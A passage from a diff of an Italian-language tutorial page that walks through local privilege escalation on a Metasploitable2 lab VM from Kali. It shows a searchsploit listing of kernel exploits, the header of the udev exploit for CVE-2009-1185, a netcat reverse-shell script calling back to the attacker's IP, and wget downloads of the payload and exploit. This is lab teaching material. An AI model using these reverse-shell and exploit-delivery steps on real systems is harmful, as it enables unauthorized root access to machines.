+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span><span style="display:flex;"><span>uname -a
+</span></span><span style="display:flex;"><span>Linux metasploitable 2.6.24-16-server <span style="color:#75715e">#1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</span>
+</span></span><span style="display:flex;"><span>lsb_release -a
+</span></span><span style="display:flex;"><span>No LSB modules are available.
+</span></span><span style="display:flex;"><span>Distributor ID: Ubuntu
+</span></span><span style="display:flex;"><span>Description:    Ubuntu 8.04
+</span></span><span style="display:flex;"><span>Release:        8.04
+</span></span><span style="display:flex;"><span>Codename:       hardy
+</span></span></code></pre></div><p>Da qui, possiamo cercare un exploit da utilizzare. I comandi che abbiamo appena eseguito ci dicono che l&rsquo;obiettivo esegue Ubuntu 8.04 con la versione del kernel 2.6.24. Kali contiene una versione locale di Exploit-DB, un database che contiene vari exploit, codici e pubblicazioni. Possiamo accedervi con uno strumento estremamente utile chiamato SearchSploit eseguendo il comando <strong>searchsploit</strong> dal terminale:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6
+</span></span><span style="display:flex;"><span>Linux Kernel <span style="color:#f92672">(</span>Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;ldso_dynamic Stack Clash&#39;</span> Local Privilege Escalation                              | linux_x86/local/42276.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.2.25/2.4.24/2.6.2 - <span style="color:#e6db74">&#39;mremap()&#39;</span> Local Privilege Escalation                                                                                         | linux/local/160.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.2.x/2.4.x - Privileged Process Hijacking Privilege Escalation <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                                                 | linux/local/22362.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.2.x/2.4.x - Privileged Process Hijacking Privilege Escalation <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                                 | linux/local/22363.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.4.1 &lt; 2.4.37 / 2.6.1 &lt; 2.6.32-rc5 - <span style="color:#e6db74">&#39;pipe.c&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>                                                                       | linux/local/9844.py
+</span></span><span style="display:flex;"><span>Linux Kernel 2.4.23/2.6.0 - <span style="color:#e6db74">&#39;do_mremap()&#39;</span> Bound Checking Privilege Escalation                                                                                    | linux/local/145.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.4.30/2.6.11.5 - BlueTooth <span style="color:#e6db74">&#39;bluez_sock_create&#39;</span> Local Privilege Escalation                                                                          | linux/local/25289.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.4.4 &lt; 2.4.37.4 / 2.6.0 &lt; 2.6.30.4 - <span style="color:#e6db74">&#39;Sendpage&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                                                            | linux/local/19933.rb
+</span></span><span style="display:flex;"><span>Linux Kernel 2.4.x/2.6.x <span style="color:#f92672">(</span>CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE <span style="color:#ae81ff">10</span> SP2/11 / Ubuntu 8.10<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>PPC<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;sock_sendpage()&#39;</span> Local Privilege Escalation                     | linux/local/9545.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.4.x/2.6.x - <span style="color:#e6db74">&#39;Bluez&#39;</span> BlueTooth Signed Buffer Index Privilege Escalation <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                        | linux/local/926.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.4.x/2.6.x - <span style="color:#e6db74">&#39;uselib()&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>                                                                                             | linux/local/895.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.4.x/2.6.x - BlueTooth Signed Buffer Index Privilege Escalation <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                                                | linux/local/25288.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.4/2.6 <span style="color:#f92672">(</span>Fedora 11<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;sock_sendpage()&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                              | linux/local/9598.txt
+</span></span><span style="display:flex;"><span>Linux Kernel 2.4/2.6 <span style="color:#f92672">(</span>RedHat Linux <span style="color:#ae81ff">9</span> / Fedora Core <span style="color:#ae81ff">4</span> &lt; <span style="color:#ae81ff">11</span> / Whitebox <span style="color:#ae81ff">4</span> / CentOS 4<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;sock_sendpage()&#39;</span> Ring0 Privilege Escalation <span style="color:#f92672">(</span>5<span style="color:#f92672">)</span>                            | linux/local/9479.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.4/2.6 <span style="color:#f92672">(</span>x86-64<span style="color:#f92672">)</span> - System Call Emulation Privilege Escalation                                                                                       | linux_x86-64/local/4460.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.4/2.6 - <span style="color:#e6db74">&#39;sock_sendpage()&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>                                                                                          | linux/local/9641.txt
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6 <span style="color:#f92672">(</span>Debian 4.0 / Ubuntu / Gentoo<span style="color:#f92672">)</span> UDEV &lt; 1.4.1 - Local Privilege Escalation <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                                    | linux/local/8478.sh
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6 <span style="color:#f92672">(</span>Gentoo / Ubuntu 8.10/9.04<span style="color:#f92672">)</span> UDEV &lt; 1.4.1 - Local Privilege Escalation <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                       | linux/local/8572.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6 &lt; 2.6.19 <span style="color:#f92672">(</span>White Box <span style="color:#ae81ff">4</span> / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;ip_append_data()&#39;</span> Ring0 Privilege Escalation <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                             | linux_x86/local/9542.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6.0 &lt; 2.6.31 - <span style="color:#e6db74">&#39;pipe.c&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                                                            | linux/local/33321.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6.10 &lt; 2.6.31.5 - <span style="color:#e6db74">&#39;pipe.c&#39;</span> Local Privilege Escalation                                                                                             | linux/local/40812.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6.13 &lt; 2.6.17.4 - <span style="color:#e6db74">&#39;logrotate prctl()&#39;</span> Local Privilege Escalation                                                                                  | linux/local/2031.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6.13 &lt; 2.6.17.4 - <span style="color:#e6db74">&#39;sys_prctl()&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                                                    | linux/local/2004.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6.13 &lt; 2.6.17.4 - <span style="color:#e6db74">&#39;sys_prctl()&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                                    | linux/local/2005.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6.13 &lt; 2.6.17.4 - <span style="color:#e6db74">&#39;sys_prctl()&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>                                                                                    | linux/local/2006.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6.13 &lt; 2.6.17.4 - <span style="color:#e6db74">&#39;sys_prctl()&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>4<span style="color:#f92672">)</span>                                                                                    | linux/local/2011.sh
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6.17 - <span style="color:#e6db74">&#39;Sys_Tee&#39;</span> Local Privilege Escalation                                                                                                       | linux/local/29714.txt
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6.17 &lt; 2.6.24.1 - <span style="color:#e6db74">&#39;vmsplice&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                                       | linux/local/5092.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6.17.4 - <span style="color:#e6db74">&#39;proc&#39;</span> Local Privilege Escalation                                                                                                        | linux/local/2013.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6.18 &lt; 2.6.18-20 - Local Privilege Escalation                                                                                                     | linux/local/10613.c
+</span></span><span style="display:flex;"><span>Linux Kernel 2.6.19 &lt; 5.9 - <span style="color:#e6db74">&#39;Netfilter Local Privilege Escalation                                                                                                | linux/local/50135.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.22 &lt; 3.9 (x86/x64) - &#39;</span>Dirty COW /proc/self/mem<span style="color:#e6db74">&#39; Race Condition Privilege Escalation (SUID Method)                                               | linux/local/40616.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.22 &lt; 3.9 - &#39;</span>Dirty COW /proc/self/mem<span style="color:#e6db74">&#39; Race Condition Privilege Escalation (/etc/passwd Method)                                                  | linux/local/40847.cpp
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.22 &lt; 3.9 - &#39;</span>Dirty COW<span style="color:#e6db74">&#39; &#39;</span>PTRACE_POKEDATA<span style="color:#e6db74">&#39; Race Condition Privilege Escalation (/etc/passwd Method)                                               | linux/local/40839.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.23 &lt; 2.6.24 - &#39;</span>vmsplice<span style="color:#e6db74">&#39; Local Privilege Escalation (1)                                                                                         | linux/local/5093.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86-64) - &#39;</span>set_selection<span style="color:#f92672">()</span><span style="color:#e6db74">&#39; UTF-8 Off-by-One Privilege Escalation              | linux_x86-64/local/9083.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.27 &lt; 2.6.36 (RedHat x86-64) - &#39;</span>compat<span style="color:#e6db74">&#39; Local Privilege Escalation                                                                               | linux_x86-64/local/15024.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.28/3.0 (DEC Alpha Linux) - Local Privilege Escalation                                                                                           | linux/local/17391.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.29 - &#39;</span>ptrace_attach<span style="color:#f92672">()</span><span style="color:#e6db74">&#39; Race Condition Privilege Escalation                                                                                      | linux/local/8678.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.30 &lt; 2.6.30.1 / SELinux (RHEL 5) - Local Privilege Escalation                                                                                   | linux/local/9191.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.32 (Ubuntu 10.04) - &#39;</span>/proc<span style="color:#e6db74">&#39; Handling SUID Privilege Escalation                                                                                  | linux/local/41770.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.32 - &#39;</span>pipe.c<span style="color:#e6db74">&#39; Local Privilege Escalation (4)                                                                                                    | linux/local/10018.sh
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.32 &lt; 3.x (CentOS 5/6) - &#39;</span>PERF_EVENTS<span style="color:#e6db74">&#39; Local Privilege Escalation (1)                                                                            | linux/local/25444.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.36-rc8 - &#39;</span>RDS Protocol<span style="color:#e6db74">&#39; Local Privilege Escalation                                                                                              | linux/local/15285.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - &#39;</span>Full-Nelson.c<span style="color:#e6db74">&#39; Local Privilege Escalation                                                                         | linux/local/15704.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64) - &#39;</span>Mempodipper<span style="color:#e6db74">&#39; Local Privilege Escalation (1)                                                             | linux/local/18411.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.39 &lt; 3.2.2 (x86/x64) - &#39;</span>Mempodipper<span style="color:#e6db74">&#39; Local Privilege Escalation (2)                                                                             | linux/local/35161.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.9 &lt; 2.6.11 (RHEL 4) - &#39;</span>SYS_EPoll_Wait<span style="color:#e6db74">&#39; Local Integer Overflow / Local Privilege Escalation                                                      | linux/local/1397.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.x (Gentoo 2.6.29rc1) - &#39;</span>ptrace_attach<span style="color:#e6db74">&#39; Local Privilege Escalation                                                                               | linux/local/8673.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.x - &#39;</span>pipe.c<span style="color:#e6db74">&#39; Local Privilege Escalation (2)                                                                                                     | linux/local/33322.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.x - &#39;</span>SYS_EPoll_Wait<span style="color:#e6db74">&#39; Local Integer Overflow / Local Privilege Escalation (1)                                                                    | linux/local/25202.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.x - Ext4 &#39;</span>move extents<span style="color:#e6db74">&#39; ioctl Privilege Escalation                                                                                              | linux/local/33395.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.x - Ptrace Privilege Escalation                                                                                                                 | linux/local/30604.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - &#39;</span>Mutagen Astronomy<span style="color:#e6db74">&#39; Local Privilege Escalation                                           | linux_x86-64/local/45516.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 2.6.11.5 - BlueTooth Stack Privilege Escalation                                                                                                   | linux/local/4756.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 2.6.19 (Debian 4) - &#39;</span>udp_sendmsg<span style="color:#e6db74">&#39; Local Privilege Escalation (3)                                                                                  | linux/local/9575.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 2.6.19 (x86/x64) - &#39;</span>udp_sendmsg<span style="color:#e6db74">&#39; Local Privilege Escalation (2)                                                                                   | linux/local/9574.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 2.6.22 - &#39;</span>ftruncate<span style="color:#f92672">()</span><span style="color:#e6db74">&#39;/&#39;</span>open<span style="color:#f92672">()</span><span style="color:#e6db74">&#39; Local Privilege Escalation                                                                                        | linux/local/6851.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 2.6.28 - &#39;</span>fasync_helper<span style="color:#f92672">()</span><span style="color:#e6db74">&#39; Local Privilege Escalation                                                                                             | linux/local/33523.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 2.6.29 - &#39;</span>exit_notify<span style="color:#f92672">()</span><span style="color:#e6db74">&#39; Local Privilege Escalation                                                                                               | linux/local/8369.sh
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 2.6.34 (Ubuntu 10.10 x86) - &#39;</span>CAP_SYS_ADMIN<span style="color:#e6db74">&#39; Local Privilege Escalation (1)                                                                        | linux_x86/local/15916.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 2.6.34 (Ubuntu 10.10 x86/x64) - &#39;</span>CAP_SYS_ADMIN<span style="color:#e6db74">&#39; Local Privilege Escalation (2)                                                                    | linux/local/15944.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - &#39;</span>CAN BCM<span style="color:#e6db74">&#39; Local Privilege Escalation                                                                         | linux/local/14814.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 2.6.36-rc4-git2 (x86-64) - &#39;</span>ia32syscall<span style="color:#e6db74">&#39; Emulation Privilege Escalation                                                                           | linux_x86-64/local/15023.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 2.6.36.2 (Ubuntu 10.04) - &#39;</span>Half-Nelson.c<span style="color:#e6db74">&#39; Econet Privilege Escalation                                                                             | linux/local/17787.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 2.6.37-rc2 - &#39;</span>ACPI custom_method<span style="color:#e6db74">&#39; Local Privilege Escalation                                                                                      | linux/local/15774.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Linux Kernel &lt; 2.6.7-rc3 (Slackware 9.1 / Debian 3.0) - &#39;</span>sys_chown<span style="color:#f92672">()</span><span style="color:#e6db74">&#39; Group Ownership Alteration Privilege Escalation                                            | linux/local/718.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ReiserFS (Linux Kernel 2.6.34-rc3 / RedHat / Ubuntu 9.10) - &#39;</span>xattr<span style="color:#960050;background-color:#1e0010">&#39;</span> Local Privilege Escalation                                                                   | linux/local/12130.py
+</span></span><span style="display:flex;"><span>Samba 2.2.8 <span style="color:#f92672">(</span>Linux Kernel 2.6 / Debian / Mandrake<span style="color:#f92672">)</span> - Share Privilege Escalation                                                                                  | linux/local/23674.txt
+</span></span></code></pre></div><p>Poiché stiamo cercando un exploit di privilage escalation, cerchiamo <strong>privilege</strong>, quindi utilizziamo <em>grep</em> per convogliare la nostra ricerca in risultati più ristretti ignorando maiuscole e minuscole con il flag <em>-i</em>. Per questo esempio, utilizzeremo l&rsquo;exploit 8572.c, che sfrutta un difetto nel gestore dispositivi UDEV, consentendo l&rsquo;esecuzione del codice tramite un messaggio Netlink non verificato. Basta copiare la posizione dell&rsquo;exploit e utilizzare il comando locate per trovare il percorso completo, che è <strong>/usr/share/exploitdb/exploits/linux/local/8572.c</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ locate linux/local/8572.c
+</span></span><span style="display:flex;"><span>/usr/share/exploitdb/exploits/linux/local/8572.c
+</span></span></code></pre></div><p>Questo exploit è scritto in C (da cui l&rsquo;estensione .c), ma non dovremo preoccuparci del codice sorgente: verrà eseguito solo dopo averlo compilato, ma non fa male prendere l&rsquo;abitudine di leggere codice per vedere esattamente cosa fa. Ora possiamo estrarre quel file per visualizzare le informazioni su questo exploit oltre a eventuali note per gli sviluppatori:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* cve-2009-1185.c
+</span></span><span style="display:flex;"><span>*
+</span></span><span style="display:flex;"><span>* udev &lt; <span style="color:#ae81ff">1141</span> Local Privilege Escalation Exploit
+</span></span><span style="display:flex;"><span>* Jon Oberheide &lt;jon@oberheide.org&gt;
+</span></span><span style="display:flex;"><span>* http://jon.oberheide.org
+</span></span><span style="display:flex;"><span>*
+</span></span><span style="display:flex;"><span>* Information:
+</span></span><span style="display:flex;"><span>*
+</span></span><span style="display:flex;"><span>*   http://cvemitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2009-1185
+</span></span><span style="display:flex;"><span>*
+</span></span><span style="display:flex;"><span>*   udev before 1.4.1 does not verify whether a NETLINK message originates
+</span></span><span style="display:flex;"><span>*   from kernel space, which allows local users to gain privileges by sending
+</span></span><span style="display:flex;"><span>*   a NETLINK message from user space.
+</span></span><span style="display:flex;"><span>*
+</span></span><span style="display:flex;"><span>* Notes:
+</span></span><span style="display:flex;"><span>*
+</span></span><span style="display:flex;"><span>*   An alternative version of kcope<span style="color:#960050;background-color:#1e0010">&#39;</span>s exploit.  This exploit leverages the
+</span></span><span style="display:flex;"><span>*   95-udev-late.rules functionality that is meant to run arbitrary commands
+</span></span><span style="display:flex;"><span>*   when a device is removed.  A bit cleaner and reliable as long as you
+</span></span><span style="display:flex;"><span>*   distro ships that rule file.
+</span></span><span style="display:flex;"><span>*
+</span></span><span style="display:flex;"><span>*   Tested on Gentoo, Intrepid, and Jaunty.
+</span></span><span style="display:flex;"><span>*
+</span></span><span style="display:flex;"><span>* Usage:
+</span></span><span style="display:flex;"><span>*
+</span></span><span style="display:flex;"><span>*   Pass the PID of the udevd netlink socket <span style="color:#f92672">(</span>listed in /proc/net/netlink,
+</span></span><span style="display:flex;"><span>*   usually is the udevd PID minus 1<span style="color:#f92672">)</span> as argv<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>.
+</span></span><span style="display:flex;"><span>*
+</span></span><span style="display:flex;"><span>*   The exploit will execute /tmp/run as root so throw whatever payload you
+</span></span><span style="display:flex;"><span>*   want in there.
+</span></span></code></pre></div><p>Per utilizzare questo exploit, deve trovarsi sulla macchina di destinazione. Il modo più semplice per farlo è ospitare il file su un server Apache locale sulla nostra macchina Kali, connettersi al server dalla macchina di destinazione e infine scaricare il file. Prima di farlo, tuttavia, è necessario compiere alcuni passaggi preparatori.</p>
 <p>Innanzitutto, dobbiamo assicurarci che il server sia attivo e funzionante su Kali, quindi eseguiamo <strong>service apache2 restart</strong> nel terminale. Successivamente, possiamo creare un collegamento simbolico tra la directory in cui si trova l&rsquo;exploit e la directory che serve i file sul server; Questo renderà l&rsquo;exploit disponibile per il download. Per fare ciò, eseguiamo il seguente comando:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo ln -s /usr/share/exploitdb/exploits/linux/local/ /var/www/html/
-</code></pre></div><p>Questo exploit verrà eseguito dalla directory /tmp in Metasploitable2, quindi prima dobbiamo creare il file che verrà eseguito. Su Kali ancora, digitiamo <strong>nano /var/www/html/run</strong> e inserisci queste righe nel file:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
-</span><span style="color:#75715e"></span>nc 192.168.1.176 <span style="color:#ae81ff">4321</span> -e /bin/bash
-</code></pre></div><p>Quando questo file viene eseguito, utilizzerà Netcat per connettersi all&rsquo;indirizzo IP di Kali sulla porta 4321 e generare una shell. Premiamo <em>Ctrl-X</em>, <em>Y</em> e <em>Enter</em> per salvare.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ln -s /usr/share/exploitdb/exploits/linux/local/ /var/www/html/
+</span></span></code></pre></div><p>Questo exploit verrà eseguito dalla directory /tmp in Metasploitable2, quindi prima dobbiamo creare il file che verrà eseguito. Su Kali ancora, digitiamo <strong>nano /var/www/html/run</strong> e inserisci queste righe nel file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>nc 192.168.1.176 <span style="color:#ae81ff">4321</span> -e /bin/bash
+</span></span></code></pre></div><p>Quando questo file viene eseguito, utilizzerà Netcat per connettersi all&rsquo;indirizzo IP di Kali sulla porta 4321 e generare una shell. Premiamo <em>Ctrl-X</em>, <em>Y</em> e <em>Enter</em> per salvare.</p>
 <p>Ora siamo pronti per caricare i file su Metasploitable2. Tornando alla nostra shell di basso livello, spostiamoci nella directory /tmp e utilizza l&rsquo;utilità <strong>wget</strong> per connetterci al server in esecuzione su Kali e trasferire i file su Metasploitable2:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd /tmp
-wget http://192.168.1.176/run
---15:18:31--  http://192.168.1.176/run
-           <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;run&#39;</span>
-Connecting to 192.168.1.176:80... connected.
-HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
-Length: <span style="color:#ae81ff">46</span>
-
-    OK                                                  100%  978.43 KB/s
-
-15:18:31 <span style="color:#f92672">(</span>978.43 KB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;run&#39;</span> saved <span style="color:#f92672">[</span>46/46<span style="color:#f92672">]</span>
-
-wget http://192.168.1.176/local/8752.c
---15:19:24--  http://192.168.1.176/8572.c
-           <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;8572.c&#39;</span>
-Connecting to 192.168.1.176:80... connected.
-HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
-Length: 2,876 <span style="color:#f92672">(</span>2.8K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/x-csrc<span style="color:#f92672">]</span>
-
-    OK                                                  100%  100.46 MB/s
-
-15:19:24 <span style="color:#f92672">(</span>100.46 MB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;8572.c&#39;</span> saved <span style="color:#f92672">[</span>2876/2876<span style="color:#f92672">]</span>
-</code></pre></div><p>Ora che i file necessari per eseguire questo exploit sono stati trasferiti con successo al nostro obiettivo, siamo quasi pronti per l&rsquo;esecuzione. Poiché il file exploit è codificato in C, dobbiamo compilarlo in un eseguibile. Non entreremo nel dettaglio dei linguaggi compilati qui ma, fondamentalmente, c&rsquo;è del codice sorgente che deve essere compilato per essere eseguito. Possiamo farlo su sistemi Linux usando GCC (GNU Compiler Collection).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /tmp
+</span></span><span style="display:flex;"><span>wget http://192.168.1.176/run
+</span></span><span style="display:flex;"><span>--15:18:31--  http://192.168.1.176/run
+</span></span><span style="display:flex;"><span>           <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;run&#39;</span>
+</span></span><span style="display:flex;"><span>Connecting to 192.168.1.176:80... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">46</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    OK                                                  100%  978.43 KB/s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>15:18:31 <span style="color:#f92672">(</span>978.43 KB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;run&#39;</span> saved <span style="color:#f92672">[</span>46/46<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wget http://192.168.1.176/local/8752.c
+</span></span><span style="display:flex;"><span>--15:19:24--  http://192.168.1.176/8572.c
+</span></span><span style="display:flex;"><span>           <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;8572.c&#39;</span>
+</span></span><span style="display:flex;"><span>Connecting to 192.168.1.176:80... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: 2,876 <span style="color:#f92672">(</span>2.8K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/x-csrc<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    OK                                                  100%  100.46 MB/s
